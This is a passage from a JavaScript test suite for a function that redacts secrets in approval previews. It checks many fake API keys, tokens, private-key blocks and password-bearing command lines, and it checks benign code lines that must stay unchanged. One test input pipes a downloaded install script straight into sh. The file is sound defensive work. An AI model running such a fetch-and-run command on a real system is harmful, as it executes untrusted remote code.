// maskSecrets (lib/permissions.mjs) is what keeps a secret out of the approval card, the pending list, the history and the hook messages. The card of a file change (P8 ux-7) now shows lines of
// real files, so the spellings of a secret that code and configuration really use have to be covered, and the lines of code that only talk about secrets have to stay readable.
//
//  1. every spelling in the first table is masked: the secret is gone and the rest of the line is still there
//  2. every line in the second table is left exactly as it is (an identifier that holds the word "token" is not a secret)
//  3. the lines that the audit of PR #103 listed: 49 spellings of a secret that all have to be masked, 47 lines of code that all have to stay as they are; the exemptions that keep the
//     47 readable (a type, a read of the environment, a placeholder, a fetch option) are narrow: a value that only looks like one is still masked
//  4. the time it takes does not depend on how the text is laid out
import assert from 'node:assert/strict';
import { maskSecrets, previewArguments } from '../lib/permissions.mjs';
import { hideKeyBlocks } from '../lib/approval-preview.mjs';
import { JSON_TEXT_SHAPES } from './support/json-text-shapes.mjs';
import { BEGIN as KEY_BEGIN_FRAME, END as KEY_END_FRAME, KEY_BODY as KEY_BODY_LINES, LAST_LINE as KEY_LAST_LINE, keyShapes, piecesIn } from './support/key-shapes.mjs';

let checks = 0;
const ok = (label) => { checks += 1; console.log(`  ok - ${label}`); };
setTimeout(() => { console.error('FAIL: the mask suite exceeded its own time budget'); process.exit(2); }, 60_000).unref();

// A secret in this file is built at run time, never written as a literal.
const R = 'Ab12Cd34Ef56';
const TOKEN = `ghp_${'Zx9Yw8Vu7T'.repeat(4)}`;
const STRIPE = ['sk', 'live', '4eC39HqLyjWDarjtT1zdp7dc'].join('_'); // built at run time: a literal of this shape is a hit of GitHub push protection
const SECRET = (what) => `${what}${R}${R}`;
const PEM_BODY = 'MIIEpAIBAAKCAQEA3Tz2mr7SZiAMfQyuvBjM9OiXx';

// [label, line, the secret that must be gone, what must still be there]
const MASKED = [
  ['openai key', `const k = "sk-${R.repeat(3)}";`, `sk-${R.repeat(3)}`, 'const k ='],
  ['openai project key in an env line', `OPENAI_API_KEY=sk-proj-${R.repeat(4)}`, `sk-proj-${R.repeat(4)}`, 'OPENAI_API_KEY='],
  ['anthropic key', `ANTHROPIC_API_KEY="sk-ant-api03-${R.repeat(4)}"`, `sk-ant-api03-${R.repeat(4)}`, 'ANTHROPIC_API_KEY='],
  ['github token', `token: ${TOKEN}`, TOKEN, 'token:'],
  ['github fine-grained token', `github_pat_${R.repeat(3)}${R}`, `github_pat_${R.repeat(3)}${R}`, ''],
  ['aws access key id', 'aws_access_key_id = AKIAABCDEFGHIJKLMNOP', 'AKIAABCDEFGHIJKLMNOP', 'aws_access_key_id ='],
  ['aws secret access key', 'aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', 'aws_secret_access_key ='],
  ['password with quotes', 'password = "Hunter2-Hunter2-Only"', 'Hunter2-Hunter2-Only', 'password ='],
  ['password in yaml', 'password: Hunter2Only9', 'Hunter2Only9', 'password:'],
  ['password with spaces in quotes', "password: 'correct horse battery staple'", 'battery staple', 'password:'],
  ['json password', '{"password": "Hunter2-Only-9"}', 'Hunter2-Only-9', '{"password":'],
  ['json token', '{"access_token":"abcdef0123456789abcdef","x":1}', 'abcdef0123456789abcdef', '"x":1}'],
  ['json private key', '"private_key": "-----BEGIN PRIVATE KEY-----\\nMIIEvQ..."', 'MIIEvQ', '"private_key":'],
  ['env password with a prefix', 'DB_PASSWORD=Sup3rS3cretValue', 'Sup3rS3cretValue', 'DB_PASSWORD='],
  ['camel case secret', "const clientSecret = 'abcd1234efgh5678';", 'abcd1234efgh5678', 'const clientSecret ='],
  ['snake case secret', 'client_secret = abcd1234efgh5678', 'abcd1234efgh5678', 'client_secret ='],
  ['secret key attribute', 'app.config["SECRET_KEY"] = "dev-key-9f8e7d6c5b4a"', 'dev-key-9f8e7d6c5b4a', 'app.config["SECRET_KEY"]'],
  ['api key header', 'x-api-key: 0123456789abcdef0123456789abcdef', '0123456789abcdef0123456789abcdef', 'x-api-key:'],
  ['bearer', 'Authorization: Bearer abcdefghijklmnop1234567890', 'abcdefghijklmnop1234567890', 'Authorization: Bearer'],
  ['basic authorization', 'Authorization: Basic dXNlcjpwYXNzd29yZA==', 'dXNlcjpwYXNzd29yZA==', 'Authorization:'],
  ['authorization in a header object', "headers: { 'Authorization': 'Token 0123456789abcdef' }", '0123456789abcdef', 'headers:'],
  ['url with a password', 'postgres://admin:Sup3rS3cret@db.example.com/app', 'Sup3rS3cret', 'postgres://admin:'],
  ['token in a query string', 'https://x.test/cb?token=abcdef0123456789&x=1', 'abcdef0123456789', '&x=1'],
  ['slack token', 'xoxb-1234567890-abcdefghij', 'xoxb-1234567890-abcdefghij', ''],
  ['google key', `AIza${'B'.repeat(35)}`, `AIza${'B'.repeat(35)}`, ''],
  ['stripe live key', STRIPE, STRIPE, ''],
  ['npm token', `npm_${R.repeat(3)}`, `npm_${R.repeat(3)}`, ''],
  ['pypi token', `pypi-${R.repeat(3)}`, `pypi-${R.repeat(3)}`, ''],
  ['google oauth token', `ya29.${R.repeat(3)}`, `ya29.${R.repeat(3)}`, ''],
  ['github token on its own', TOKEN, TOKEN, ''],
  ['aws access key id on its own', 'AKIAABCDEFGHIJKLMNOP', 'AKIAABCDEFGHIJKLMNOP', ''],
  ['openai key on its own', `sk-${R.repeat(3)}`, `sk-${R.repeat(3)}`, ''],
  ['gitlab token', `glpat-${R.repeat(2)}`, `glpat-${R.repeat(2)}`, ''],
  ['hugging face token', `hf_${R.repeat(3)}`, `hf_${R.repeat(3)}`, ''],
  ['sendgrid key', `SG.${R.repeat(2)}.${R.repeat(2)}`, `SG.${R.repeat(2)}.${R.repeat(2)}`, ''],
  ['jwt', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0', ''],
  ['key material body', PEM_BODY, PEM_BODY, ''],
  ['the registered secret', 'value = registered-secret-value-4711', 'registered-secret-value-4711', 'value ='],
];

// lines of code and prose that talk about secrets and are not one: they must come back as they went in
const BENIGN = [
  'if (password.length < 8) {',
  "const passwordInput = document.getElementById('pw');",
  'tokenizer = Tokenizer.from_pretrained(name)',
  '"max_tokens": 1000000,',
  'max_tokens: 4096',
  'const tokenCount = tokens.length;',
  'const SECRET_KEYS = /authorization|secret|password|token|api.?key|private.?key/i;',
  'export const TOKEN_PATTERNS = [',
  'password: z.string().min(8),',
  'token = getToken()',
  'function resetPassword(email) {',
  '// the token is read from the environment',
  'const secretary = new Secretary();',
  'password: ${DB_PASSWORD}',
  'token: ${{ secrets.GITHUB_TOKEN }}',
  'api_key: <your key here>',
  'const keyboard = 12345678;',
  'Authorization is checked before the handler runs.',
  'for (const token of tokens) {',
  'password_field = forms.CharField(widget=forms.PasswordInput)',
  'token: 123456789',
  'token = /abcdefghij/;',
  'password: none',
  'token: abc',
  'password: "no"',
  'the bearer of bad news',
];

for (const [label, line, secret, kept] of MASKED) {
  const masked = maskSecrets(line, ['registered-secret-value-4711']);
  assert.ok(!masked.includes(secret), `${label}: the secret is still there: ${masked}`);
  assert.ok(masked.includes('[REDACTED]'), `${label}: nothing says it was masked: ${masked}`);
  if (kept) assert.ok(masked.includes(kept), `${label}: the rest of the line was lost: ${masked}`);
}
ok(`${MASKED.length} spellings of a secret: the secret is gone, the words around it stay`);

for (const line of BENIGN) assert.equal(maskSecrets(line, ['registered-secret-value-4711']), line, `a line that holds no secret was changed: ${line}`);
ok(`${BENIGN.length} lines of code and prose that only mention secrets come back unchanged`);

// ---------------------------------------------------------------------------------------------------------------- 3. the lines of the audit of PR #103
// The audit probed 49 spellings of a secret (8 of them leaked) and 47 lines of ordinary code (11 of them were altered). All of them are here. A value built at run time never sits in this
// file as a literal; the shapes of vendors' tokens are joined from parts, so that no scanner takes this file for a leak.
const V = 'Zq8fJ2mK9xLp4Rt7';
const J = (...parts) => parts.join('');
const NL = '\n';
const AUDIT_MASKED = [
  [`DB_PASSWORD=${V}`, V], [`password: "${V}"`, V], [`"password": "${V}"`, V], [`clientSecret = '${V}';`, V], [`const apiKey = "${V}";`, V], [`api_key=${V}`, V],
  [`export AWS_SECRET_ACCESS_KEY=${V}${V}`, V], [`aws_secret_access_key = ${V}${V}`, V], [`"access_token": "${V}${V}"`, V], [`X-Api-Key: ${V}${V}`, V], ['Authorization: Basic dXNlcjpwYXNzd29yZDEyMw==', 'dXNlcjpwYXNzd29yZDEyMw'],
  [`Authorization: Bearer ${V}${V}`, V], [`app.config["SECRET_KEY"] = "${V}"`, V], [`SECRET_KEY = '${V}'`, V], [`token = ${V}${V}`, V], [`passwd: ${V}`, V], [`PASSPHRASE=${V}`, V],
  [`DATABASE_URL=postgres://admin:${V}@db.example.com:5432/app`, V], [`url = "https://user:${V}@host.example.com/repo.git"`, V], [`mongodb://root:${V}@cluster0.example.net/db`, V],
  [J('sk', '-', 'proj', '-', 'A1b2C3d4E5f6G7h8I9j0K1l2'), 'A1b2C3d4E5f6G7h8I9j0K1l2'], [J('gh', 'p_', 'a'.repeat(36)), 'a'.repeat(30)], [J('A', 'KIA', 'IOSFODNN7EXAMPLE'), 'IOSFODNN7EXAMPLE'],
  [J('xox', 'b-', '123456789012-1234567890123-AbCdEfGhIjKlMnOpQrStUvWx'), 'AbCdEfGhIjKlMnOpQrStUvWx'], [J('s', 'k_live_', 'a1b2c3d4e5f6g7h8i9j0k1l2'), 'a1b2c3d4e5f6g7h8i9j0k1l2'],
  [J('AI', 'za', 'SyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q'), 'SyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q'], [J('ey', 'JhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk'), 'dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk'],
  [J('glp', 'at-', 'abcdefghij0123456789'), 'abcdefghij0123456789'], [J('np', 'm_', 'a'.repeat(36)), 'a'.repeat(30)], [J('h', 'f_', 'b'.repeat(34)), 'b'.repeat(30)],
  [J('"private_key": "-----BEGIN PRIVATE KEY-----', '\\n', 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7', '\\n', '-----END PRIVATE KEY-----\\n"'), 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7'],
  [J('-----BEGIN RSA PRIVATE KEY-----', NL, 'MIIEowIBAAKCAQEA3Tz2mr7SZiAMfQyuvBjM9Oi', NL, '-----END RSA PRIVATE KEY-----'), 'MIIEowIBAAKCAQEA3Tz2mr7SZiAMfQyuvBjM9Oi'],
  [J('-----BEGIN OPENSSH PRIVATE KEY-----', NL, 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW', NL, '-----END OPENSSH PRIVATE KEY-----'), 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW'],
  [J('-----BEGIN PGP PRIVATE KEY BLOCK-----', NL, 'lQdGBF2xYZkBEADl3Kx9mP0qTz7RvW2nB8cD4eF6gH1jK3lM5nP7qR9sT1uV3wX5', NL, '-----END PGP PRIVATE KEY BLOCK-----'), 'lQdGBF2xYZkBEADl3Kx9mP0qTz7RvW2nB8cD4eF6gH1jK3lM5nP7qR9sT1uV3wX5'],
  [`ssh_key="${V}${V}"`, V], [`ACCESS_KEY: ${V}`, V], [`private_key = ${V}${V}`, V], [`credentials = '${V}'`, V], [`SLACK_BOT_TOKEN=${J('xox', 'b-', '1111111111-2222222222222-', 'a'.repeat(24))}`, 'a'.repeat(20)],
  [`curl -H "Authorization: Bearer ${V}${V}" https://api.example.com`, V], [`curl -u admin:${V} https://example.com`, V], [`--password ${V}`, V], [`mysql -u root -p${V}`, V], [`PGPASSWORD=${V} psql`, V], [`sshpass -p '${V}' ssh host`, V],
  [`<password>${V}</password>`, V], [`<add key="ApiKey" value="${V}${V}" />`, V], [`secret: ${V}`, V], [`"client_secret":"${V}${V}"`, V],
];
const AUDIT_BENIGN = [
  'const tokenCount = 5;', 'tokenizer.encode(text)', 'passwordInput.focus();', 'if (password.length < 8) return;', 'const secretsFound = scan(text);', 'function getToken() { return token; }',
  'const token = getToken();', 'token: string;', 'apiKey: string;', 'password: string,', 'secret: boolean', 'private_key: Buffer;', 'readonly apiKey: string', 'let password = "";', 'password = ""', 'token = None',
  'password = os.environ["DB_PASSWORD"]', 'api_key = os.getenv("API_KEY")', 'const apiKey = process.env.API_KEY;', 'secret = ${SECRET}', 'password: <your-password>', 'token = $TOKEN', 'API_KEY=changeme',
  'const { token, refreshToken } = auth;', 'headers["Authorization"] = `Bearer ${token}`;', 'passwordHash = hash(password)', 'this.token = token;', '// the token is rotated daily', '# password must have 8 characters',
  'if (!apiKey) throw new Error("missing api key");', 'const secretKey = Symbol("secret");', 'type Token = { value: string }', 'tokens.push(next);', 'credentials: "include"', 'accessToken?: string;',
  'password: 123456', 'const sha = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";', 'const id = "550e8400-e29b-41d4-a716-446655440000";', 'git commit -m "fix token refresh"', 'const keyboard = new Keyboard();',
  'monkey: banana', 'the monkey-patch of token handling', 'tokenType: "Bearer"', 'const passwd_file = "/etc/passwd";', 'ssh-keygen -t ed25519 -C "me@example.com"', 'echo "set the password later"', 'password_field = forms.PasswordInput()',
];
assert.equal(AUDIT_MASKED.length, 49, 'the table is the audit\'s');
assert.equal(AUDIT_BENIGN.length, 47, 'the table is the audit\'s');
for (const [line, secret] of AUDIT_MASKED) {
  const masked = maskSecrets(line, []);
  assert.ok(!masked.includes(secret), `the secret is still there: ${line.length > 100 ? `${line.slice(0, 100)}...` : line} -> ${masked.length > 140 ? `${masked.slice(0, 140)}...` : masked}`);
  assert.ok(masked.includes('[REDACTED]'), `nothing says it was masked: ${line}`);
}
ok(`${AUDIT_MASKED.length} spellings of a secret from the audit: every one is masked (flags of a command, a PGP key, ssh_key and two XML spellings were not)`);
for (const line of AUDIT_BENIGN) assert.equal(maskSecrets(line, []), line, `a line that holds no secret was changed: ${line}`);
ok(`${AUDIT_BENIGN.length} lines of ordinary code from the audit come back unchanged (a type, a read of the environment, a placeholder and a fetch option are not secrets)`);

// What a command line, a file of XML and a type annotation can hold besides a secret: these lines also stay as they are.
const COMMAND_AND_XML_BENIGN = [
  'gcc -pthread -O2 main.c', 'docker run -p 8080:80 nginx', 'ssh -p 2222 host', 'mysql -u root -p', 'mysql -u root -p mydb', 'curl -u admin https://example.com', 'git push -u origin main', 'rsync -u src/ dst/',
  'echo "$PASSWORD" | docker login -u me --password-stdin registry.example.test', 'deploy --password "$DB_PASSWORD" --env prod', 'deploy --token ${TOKEN} run', 'deploy --password-file /run/secrets/db',
  'psql --no-password mydb', 'tool --token', 'tool --password -x', 'sshpass -f /run/secrets/pw ssh host', 'mysql -u root -p"$DB_PASS"', 'docker login -u me -p "$REGISTRY_PASSWORD" registry.example.test',
  '<password>${env.DB_PASSWORD}</password>', '<password></password>', '<password>changeme</password>', '<passwordField>text</passwordField>', '<add key="Mode" value="production" />', '<add key="ApiKey" value="${API_KEY}" />',
  '<property name="timeout" value="30000"/>', 'password: Optional[str] = None', 'secret: SecretStr', 'private_key: Uint8Array;', 'export const credentials: RequestCredentials = "include";',
  // user:group and uid:gid are not user:password; -P is the port of mysql, -p its password
  'docker run -u 1000:1000 --rm nginx', 'docker run --user node:node --rm app', 'docker exec -u root:root web sh', 'podman run --user 1000:1000 img', 'mysql -h h -P3306 -uroot db', 'sshpass -P assword ssh host',
];
for (const line of COMMAND_AND_XML_BENIGN) assert.equal(maskSecrets(line, []), line, `a line that holds no secret was changed: ${line}`);
ok(`${COMMAND_AND_XML_BENIGN.length} more lines (flags that are not a password, XML that holds none, types) come back unchanged`);

// The exemptions are narrow. A value that only looks like a type, a read, a placeholder or a fetch option is still masked; so is every quoted literal.
const STILL_MASKED = [
  ['a type word with more after it', 'password: string1Hunter', 'string1Hunter', 'password:'],
  ['a type word with a dot after it', 'password: string.Hunter9x', 'string.Hunter9x', 'password:'],
  ['a read that only starts like one', 'password = process.environment.Hunter9x', 'process.environment.Hunter9x', 'password ='],
  ['a dollar sign that does not start a name', 'password: $ecret!Hunter9', 'Hunter9', 'password:'],
  ['a placeholder with digits after it', 'API_KEY=changeme123', 'changeme123', 'API_KEY='],
  ['a placeholder in quotes (a quoted value is a literal)', 'API_KEY="changeme"', 'changeme', 'API_KEY='],
  ['a type word in quotes', '"password": "string"', 'string', '"password":'],
  ['a fetch option with more after it', 'credentials: "include-this-9"', 'include-this-9', 'credentials:'],
  ['a fetch option with another word', 'credentials: "Hunter2-Only"', 'Hunter2-Only', 'credentials:'],
  ['a flag that is not a password, with a secret after another one', 'psql --no-password --password Hunter2-Only mydb', 'Hunter2-Only', '--no-password'],
  ['a command line with an environment read and a literal', 'deploy --password "$DB_PASSWORD" --token Hunter2-Only run', 'Hunter2-Only', '--password "$DB_PASSWORD"'],
  ['a value in the place of a placeholder in XML', '<password>changeme-9Hunter</password>', 'changeme-9Hunter', '<password>'],
];
for (const [label, line, secret, kept] of STILL_MASKED) {
  const masked = maskSecrets(line, []);
  assert.ok(!masked.includes(secret), `${label}: the secret is still there: ${masked}`);
  assert.ok(masked.includes('[REDACTED]'), `${label}: nothing says it was masked: ${masked}`);
  assert.ok(masked.includes(kept), `${label}: the rest of the line was lost: ${masked}`);
}
ok(`${STILL_MASKED.length} values that only look like an exemption are still masked`);

// The flags and tags, line by line: what stays and what goes.
const SHAPES = [
  ['curl -u', `curl -u admin:${V} https://example.com`, 'curl -u admin:[REDACTED] https://example.com'],
  ['curl --user', `curl --user admin:${V} https://example.com`, 'curl --user admin:[REDACTED] https://example.com'],
  ['curl --user=, a value in quotes', `curl --user="admin:${V} x" https://example.com`, 'curl --user="admin:[REDACTED]" https://example.com'],
  ['curl -u in quotes', `curl -u "admin:${V}" https://example.com`, 'curl -u "admin:[REDACTED]" https://example.com'],
  ['--password and a space', `deploy --password ${V} --env prod`, 'deploy --password [REDACTED] --env prod'],
  ['--password and a value in quotes', `deploy --password 'correct horse battery staple' --env prod`, "deploy --password '[REDACTED]' --env prod"],
  ['a flag with a prefix', `gh-tool --github-token ${V} run`, 'gh-tool --github-token [REDACTED] run'],
  ['--api-key', `tool --api-key ${V}${V}`, 'tool --api-key [REDACTED]'],
  ['mysql -p, attached', `mysql -u root -p${V} -h db.example.test`, 'mysql -u root -p[REDACTED] -h db.example.test'],
  ['mysqldump -p, attached and in quotes', `mysqldump -u root -p'${V}' app`, "mysqldump -u root -p'[REDACTED]' app"],
  ['sshpass -p, in quotes', `sshpass -p '${V}' ssh host`, "sshpass -p '[REDACTED]' ssh host"],
  ['sshpass -p, bare', `sshpass -p ${V} ssh host`, 'sshpass -p [REDACTED] ssh host'],
  ['docker login -p', `docker login -u me -p ${V} registry.example.test`, 'docker login -u me -p [REDACTED] registry.example.test'],
  ['xml element', `<password>${V}</password>`, '<password>[REDACTED]</password>'],
  ['xml element with an attribute', `<password encrypted="false">${V}</password>`, '<password encrypted="false">[REDACTED]</password>'],
  ['xml element with a prefix', `<db-password>${V}</db-password>`, '<db-password>[REDACTED]</db-password>'],
  ['an entry of appSettings', `<add key="ApiKey" value="${V}${V}" />`, '<add key="ApiKey" value="[REDACTED]" />'],
  ['a property of a bean', `<property name="password" value="${V}"/>`, '<property name="password" value="[REDACTED]"/>'],
  ['ssh_key in quotes', `ssh_key="${V}${V}"`, 'ssh_key="[REDACTED]"'],
  ['sshKey in camel case', `const sshKey = '${V}${V}';`, "const sshKey = '[REDACTED]';"],
];
for (const [label, line, expected] of SHAPES) assert.equal(maskSecrets(line, []), expected, `${label}: not the line that was expected`);
ok(`${SHAPES.length} shapes of a command, a tag and a name: the secret goes, the rest of the line is exactly as it was`);

// Every word that an exemption or a flag is made of has a line of its own (a mutation of the word shows which one has not).
const TYPE_ANNOTATIONS = ['string', 'number', 'boolean', 'unknown', 'object', 'symbol', 'bigint', 'undefined', 'Buffer', 'ByteArray', 'Uint8Array', 'Integer', 'Double', 'Decimal', 'VARCHAR', 'Optional', 'SecretStr', 'SecureString', 'RequestCredentials'];
for (const word of TYPE_ANNOTATIONS) {
  assert.equal(maskSecrets(`password: ${word};`, []), `password: ${word};`, `${word}: the type of a name is no secret`);
  assert.equal(maskSecrets(`password: ${word}9Hunter`, []), 'password: [REDACTED]', `${word}9Hunter: a value that only starts like a type is masked`);
}
const PLACEHOLDERS = ['changeme', 'change-me', 'change_me', 'replace-me', 'replace_me', 'replaceme', 'placeholder', 'redacted', 'example', 'xxxxxxxx', '********', 'your-api-key', 'your_password_here'];
for (const word of PLACEHOLDERS) {
  assert.equal(maskSecrets(`API_KEY=${word}`, []), `API_KEY=${word}`, `${word}: a placeholder is no secret`);
  assert.equal(maskSecrets(`API_KEY=${word}9Hunter`, []), 'API_KEY=[REDACTED]', `${word}9Hunter: a value that only starts like a placeholder is masked`);
}
const READS = [
  'process.env.DB_PASSWORD', 'process.env["DB_PASSWORD"]', 'process.env.DB_NAME', 'import.meta.env.VITE_API_KEY', 'import.meta.env.VITE_DB_NAME', 'os.environ["DB_PASSWORD"]', 'os.environ.DB_NAME', "$_ENV['DB_PASSWORD']",
  '$_SERVER["HTTP_X_API_KEY"]', 'ENV["DB_PASSWORD"]', 'ENV.DB_PASSWORD', 'ENV.DB_ADMIN', '$env:DB_PASSWORD', '$DB_PASSWORD', '%DB_PASSWORD%',
]; // the ones that end in a secret word are also member reads; the others (DB_NAME, DB_ADMIN) are exempt only as reads of the environment
for (const read of READS) assert.equal(maskSecrets(`password = ${read};`, []), `password = ${read};`, `${read}: a read of the environment or of a variable is no secret`);
for (const option of ['include', 'omit', 'same-origin']) assert.equal(maskSecrets(`fetch(url, { credentials: '${option}' })`, []), `fetch(url, { credentials: '${option}' })`, `credentials: '${option}' is an option of fetch`);
ok(`${TYPE_ANNOTATIONS.length} types, ${PLACEHOLDERS.length} placeholders, ${READS.length} reads and the 3 options of fetch: left alone; the same words with more after them: masked`);

// The plain name of a secret, as a value, is a variable or a type; so is a member read that ends in one. A name with a prefix and no dot is not told from a weak password by its shape.
const NAMES_AS_VALUES = [
  'this.password = password;', 'self.token = token', 'connect(host, user, password=password)', 'password: Password', 'secret: Secret;', 'secret = secretKey', 'token = tokenValue;', 'password: passwordHash,',
  'password = config.password', 'const token = this.token;', 'apiKey = options.apiKey', 'password = req.body.password;', 'db_password = settings.db_password', 'user.password = form.newPassword',
];
for (const line of NAMES_AS_VALUES) assert.equal(maskSecrets(line, []), line, `a name of a secret as a value is no secret: ${line}`);
for (const [label, line, secret, kept] of [
  ['a name with a prefix and no dot', 'password = MyPassword', 'MyPassword', 'password ='],
  ['a classic weak secret', 'jwt_secret = supersecret', 'supersecret', 'jwt_secret ='],
  ['the plain name with digits after it', 'password = password123', 'password123', 'password ='],
  ['a member read that does not end in a secret word', 'password = form.password.data', 'form.password.data', 'password ='],
  ['a name of a secret that is the plural of one', 'token = tokens-9x', 'tokens-9x', 'token ='],
]) {
  const masked = maskSecrets(line, []);
  assert.ok(!masked.includes(secret) && masked.includes('[REDACTED]') && masked.includes(kept), `${label}: ${masked}`);
}
ok(`${NAMES_AS_VALUES.length} names of secrets as values (this.password = password) stay readable, and 5 values that only look like one are masked`);

const LONG_FLAGS = ['--password', '--passwd', '--passphrase', '--pass', '--pwd', '--token', '--secret', '--api-key', '--apikey', '--access-key', '--accesskey', '--secret-key', '--secretkey', '--db-password', '--github-token'];
for (const flag of LONG_FLAGS) assert.equal(maskSecrets(`tool ${flag} ${V} run`, []), `tool ${flag} [REDACTED] run`, `${flag}: its value is masked`);
const FLAGS_WITHOUT_A_VALUE = ['no', 'skip', 'ask', 'prompt', 'disable', 'enable', 'with', 'use', 'require', 'show', 'hide', 'ignore'];
for (const prefix of FLAGS_WITHOUT_A_VALUE) assert.equal(maskSecrets(`tool --${prefix}-password mydb`, []), `tool --${prefix}-password mydb`, `--${prefix}-password takes no value`);
const MYSQL_CLIENTS = ['mysql', 'mysqldump', 'mysqladmin', 'mysqlimport', 'mysqlcheck', 'mysqlshow', 'mysqlpump', 'mariadb', 'mariadb-dump'];
for (const client of MYSQL_CLIENTS) assert.equal(maskSecrets(`${client} -u root -p${V} db`, []), `${client} -u root -p[REDACTED] db`, `${client}: its -p is the password`);
const CONTAINER_CLIENTS = ['docker', 'podman', 'nerdctl', 'buildah', 'skopeo'];
for (const client of CONTAINER_CLIENTS) assert.equal(maskSecrets(`${client} login -u me -p ${V} registry.example.test`, []), `${client} login -u me -p [REDACTED] registry.example.test`, `${client} login: its -p is the password`);
ok(`${LONG_FLAGS.length} flags, ${FLAGS_WITHOUT_A_VALUE.length} flags that take no value, ${MYSQL_CLIENTS.length} clients of MySQL and ${CONTAINER_CLIENTS.length} container clients`);

const COMMAND_LINES = [
  ['sshpass with its password glued to -p', `sshpass -p${V} ssh host`, 'sshpass -p[REDACTED] ssh host'],
  ['a flag within 200 characters of its command', `mysql${' x'.repeat(75)} -p${V} db`, `mysql${' x'.repeat(75)} -p[REDACTED] db`],
  ['a flag beyond 200 characters of its command (the limit)', `mysql${' x'.repeat(150)} -p${V} db`, `mysql${' x'.repeat(150)} -p${V} db`],
  ['-u with no command in front of it: a user and a password', `  -u admin:${V} \\`, `  -u admin:[REDACTED] \\`],
  ['curl over several lines, -u on a line of its own (backslash)', `curl -sS \\\n  -u "svc:${V}" \\\n  https://example.com`, 'curl -sS \\\n  -u "svc:[REDACTED]" \\\n  https://example.com'],
  ['the same with a bare value and Windows line endings', `curl -sS \\\r\n  -u svc:${V} \\\r\n  https://example.com`, 'curl -sS \\\r\n  -u svc:[REDACTED] \\\r\n  https://example.com'],
  ['a caret, as cmd continues a line', `curl.exe ^\n  --user svc:${V} ^\n  https://example.com`, 'curl.exe ^\n  --user svc:[REDACTED] ^\n  https://example.com'],
  ['a backtick, as PowerShell continues a line', `curl.exe \`\n  --proxy-user svc:${V} \`\n  https://example.com`, 'curl.exe `\n  --proxy-user svc:[REDACTED] `\n  https://example.com'],
  ['spaces after the backslash still continue the line', `curl -sS \\ \t \n  -u svc:${V} url`, 'curl -sS \\ \t \n  -u svc:[REDACTED] url'],
  ['a continuation after a continuation', `curl \\\n  -H 'Accept: x' \\\n  --user svc:${V} url`, "curl \\\n  -H 'Accept: x' \\\n  --user svc:[REDACTED] url"],
  ['a line that is not continued ends the window of docker: curl above it is no reason to mask its user and group', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u node:node img', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u node:node img'],
  ['a blank line after the backslash ends the window of docker: the -u below it is masked', `docker run \\\n\n  -u svc:${V}`, `docker run \\\n\n  -u svc:[REDACTED]`],
  ['no backslash at the end: the next line is another command, and its -u is masked', `docker run img\n  -u svc:${V}`, `docker run img\n  -u svc:[REDACTED]`],
  ['a backslash that is not at the end of its line continues nothing: the -u on the next line is masked', `docker run \\ x\n  -u svc:${V}`, `docker run \\ x\n  -u svc:[REDACTED]`],
  ['curl: -u after a payload of 250 characters', `curl -X POST https://api.example.test/v1/items -d '{"query":"${'x'.repeat(210)}"}' -u admin:${V}`, `curl -X POST https://api.example.test/v1/items -d '{"query":"${'x'.repeat(210)}"}' -u admin:[REDACTED]`],
  ['curl: after a payload of 600', `curl -X POST https://api.example.test/v1/items -d '{"query":"${'x'.repeat(560)}"}' -u admin:${V}`, `curl -X POST https://api.example.test/v1/items -d '{"query":"${'x'.repeat(560)}"}' -u admin:[REDACTED]`],
  ['curl: after a long URL with a query string', `curl "https://api.example.test/v1/search?q=${'a'.repeat(220)}&limit=50" -u svc:${V}`, `curl "https://api.example.test/v1/search?q=${'a'.repeat(220)}&limit=50" -u svc:[REDACTED]`],
  ['curl over six lines, the payload before -u', ['curl -sS -X POST \\', '  -H "Content-Type: application/json" \\', '  -H "Accept: application/json" \\', `  -d '{"query": "${'q'.repeat(120)}"}' \\`, '  --max-time 30 \\', `  -u "svc:${V}" \\`, '  https://api.example.test/graphql'].join('\n'), ['curl -sS -X POST \\', '  -H "Content-Type: application/json" \\', '  -H "Accept: application/json" \\', `  -d '{"query": "${'q'.repeat(120)}"}' \\`, '  --max-time 30 \\', '  -u "svc:[REDACTED]" \\', '  https://api.example.test/graphql'].join('\n')],
  ['curl with long header lines', ['curl -sS \\', `  -H "Authorization-Hint: ${'h'.repeat(90)}" \\`, `  -H "X-Other: ${'o'.repeat(90)}" \\`, `  -u svc:${V} https://api.example.test`].join('\n'), ['curl -sS \\', `  -H "Authorization-Hint: ${'h'.repeat(90)}" \\`, `  -H "X-Other: ${'o'.repeat(90)}" \\`, '  -u svc:[REDACTED] https://api.example.test'].join('\n')],
  ['curl kept in a variable and used far below', ['CURL="curl -sS --fail"', `# ${'comment '.repeat(30)}`, `$CURL -u svc:${V} https://api.example.test`].join('\n'), ['CURL="curl -sS --fail"', `# ${'comment '.repeat(30)}`, '$CURL -u svc:[REDACTED] https://api.example.test'].join('\n')],
  // The flags of the user (-u, --user, --proxy-user) are a user and a password wherever they stand, but for a user and a group: a numeric pair, and the flags of docker, podman, nerdctl and buildah.
  // Both need the COMMAND that holds the flag to have no curl and no URL before the flag; the command is what lies between the last ; & | or line ending (a continuation of the line is no line ending)
